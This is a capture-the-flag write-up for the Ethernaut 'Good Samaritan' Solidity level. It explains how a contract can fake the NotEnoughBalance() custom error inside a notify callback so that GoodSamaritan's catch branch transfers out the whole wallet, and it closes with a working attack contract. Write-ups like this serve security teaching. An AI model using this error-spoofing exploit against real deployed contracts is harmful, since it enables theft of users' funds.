---
title: "Ethernaut 27 Good Samaritan"
description: "Ethernaut 27 Good Samaritan writeup"
---

## Challenge
### Prompt
This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it.
Would you be able to drain all the balance from his Wallet?
Things that might help:
Solidity Custom Errors
### Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns (bool enoughBalance) {
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10 ** 6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```
## Background

---

A Solidity custom error is defined like `error NotEnoughBalance();` and raised with `revert NotEnoughBalance();`. In the ABI, as with a function call, the selector hashed from the error signature is placed at the front of the revert data.
The revert data for the argument-less `NotEnoughBalance()` is `bytes4(keccak256("NotEnoughBalance()"))`. This name is not checked with a per-contract namespace. So if a different contract reverts a custom error with the same name and the same argument structure, the outer contract can mistake it for the same error.

---

`try wallet.donate10(msg.sender)` goes to the `try` block if the external call succeeds, and to the `catch` block if a revert occurs during the call. `catch (bytes memory err)` receives the revert data as-is.
In this challenge, `catch` compares the revert reason directly as follows.
```solidity
keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)
```
This approach cannot distinguish whether the error actually came from the balance check inside `Wallet.donate10`, or whether the recipient contract deliberately produced the same selector.

---

`Coin.transfer` checks whether the recipient is a contract and then calls `notify(amount_)`.
```solidity
if (dest_.isContract()) {
    INotifyable(dest_).notify(amount_);
}
```
This call runs the code of the contract receiving the tokens. If the recipient contract reverts here, the whole `Coin.transfer` reverts, and that revert propagates through `Wallet.donate10` all the way to the `catch` of `GoodSamaritan.requestDonation`.
## Analyzing the challenge code

---

Here is the initial state.
```solidity
constructor(address wallet_) {
    // one million coins for Good Samaritan initially
    balances[wallet_] = 10 ** 6;
}
```
When `Coin` is created, it places $10^6$ coins on the `Wallet` address. The level's goal is to drain all the coins this `Wallet` holds.
In the normal flow, each call to `requestDonation()` only grants 10. Simply repeating is inefficient, so we need to make `transferRemainder` run.

---

`requestDonation` branches like this.
```solidity
function requestDonation() external returns (bool enoughBalance) {
    try wallet.donate10(msg.sender) {
        return true;
    } catch (bytes memory err) {
        if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
            wallet.transferRemainder(msg.sender);
            return false;
        }
    }
}
```
`requestDonation` first attempts `wallet.donate10(msg.sender)`. If it fails and the revert data equals `NotEnoughBalance()`, it concludes that fewer than 10 remain in the wallet and calls `wallet.transferRemainder(msg.sender)`.
`GoodSamaritan` does not check where `NotEnoughBalance()` came from. So if the recipient contract's `notify` raises the same custom error, execution enters the same branch.

---

Here are `donate10` and `transferRemainder`.
```solidity
function donate10(address dest_) external onlyOwner {
    if (coin.balances(address(this)) < 10) {
        revert NotEnoughBalance();
    } else {
        coin.transfer(dest_, 10);
    }
}

function transferRemainder(address dest_) external onlyOwner {
    coin.transfer(dest_, coin.balances(address(this)));
}
```
`Wallet`'s `owner` is `GoodSamaritan`. The user cannot call `Wallet` directly, but can trigger `donate10` and `transferRemainder` through `GoodSamaritan.requestDonation()`.
`donate10` runs `coin.transfer(dest_, 10)` if the balance is at least 10. During this call the attack contract's `notify(10)` is invoked, and if it reverts here with `NotEnoughBalance()`, the whole `donate10` fails. At this point the 10-coin transfer that was already decremented is rolled back too.
Then `GoodSamaritan`'s `catch` mistakes this revert for the wallet running out of balance and runs `transferRemainder`. This second transfer's amount is $10^6$, so if the attack contract's `notify` does not revert this time, we receive the entire balance.

---

The error comes from the attack contract's `notify`.
```solidity
if (dest_.isContract()) {
    INotifyable(dest_).notify(amount_);
}
```
The attack contract only needs to implement an `INotifyable`-style `notify(uint256 amount)`. In the first `donate10` path, `amount == 10`, so it raises `NotEnoughBalance()`. In the second `transferRemainder` path, `amount` is much larger than 10, so it does not revert.
The full flow:
1. Call `requestDonation()`
2. `donate10(attackContract)` runs
3. During `Coin.transfer(attackContract, 10)`, `notify(10)` is called
4. The attack contract reverts with `NotEnoughBalance()`
5. `requestDonation`'s `catch` runs `transferRemainder(attackContract)`
6. `notify(1000000)` does not revert, so the entire balance is received
## Solution
The attack contract defines its own custom error with the same signature as `Wallet.NotEnoughBalance()`. `GoodSamaritan` only compares the hash of the revert data, so raising that error in `notify(10)` looks like a real out-of-balance condition.
However, if we revert in every `notify`, the transfer that pays us the balance via `transferRemainder` fails again too. So we revert only when `amount <= 10`, and let the remaining transfer complete normally.
### Exploit
```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

contract Attack {
    IGoodSamaritan goodsamaritan;
    error NotEnoughBalance();

    constructor(address _addr) {
        goodsamaritan = IGoodSamaritan(_addr);
    }

    function attack() public {
        goodsamaritan.requestDonation();
    }

    function notify(uint256 amount) external payable {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
```
![screenshot](./image-1.png)
